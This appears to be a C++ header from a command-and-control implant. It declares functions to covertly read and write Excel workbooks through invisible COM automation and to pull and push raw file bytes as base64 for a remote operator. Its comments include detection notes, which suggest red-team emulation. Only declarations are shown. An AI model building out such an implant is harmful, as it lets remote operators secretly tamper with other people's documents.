#pragma once
#ifndef DOCOPS_H
#define DOCOPS_H
#include "common.h"

namespace DocOps {
    // Read a cell range from an Excel workbook via COM automation.
    // Opens Excel.Application invisibly, reads the range, closes.
    // sheet = sheet name (e.g. "Sheet1"), cellRef = range (e.g. "A1" or "A1:C3")
    // Detection: non-Office process instantiates Excel.Application CLSID via COM.
    std::string XlRead(const std::string& path, const std::string& sheet, const std::string& cellRef);

    // Write a value into a cell in an Excel workbook via COM, then save.
    // Opens Excel.Application invisibly, writes the cell, saves and closes.
    // Detection: programmatic Office doc modification from suspicious process.
    std::string XlWrite(const std::string& path, const std::string& sheet,
                        const std::string& cellRef, const std::string& value);

    // Read entire file as raw bytes, return base64. Works for any Office doc.
    // Use this + XlRawWrite for binary edits without COM (requires Excel not open).
    std::string XlRawRead(const std::string& path);

    // Write base64-decoded bytes back to path (overwrite). Lets the operator
    // edit the file on the C2 side and push the modified bytes back.
    std::string XlRawWrite(const std::string& path, const std::string& b64content);
}

#endif
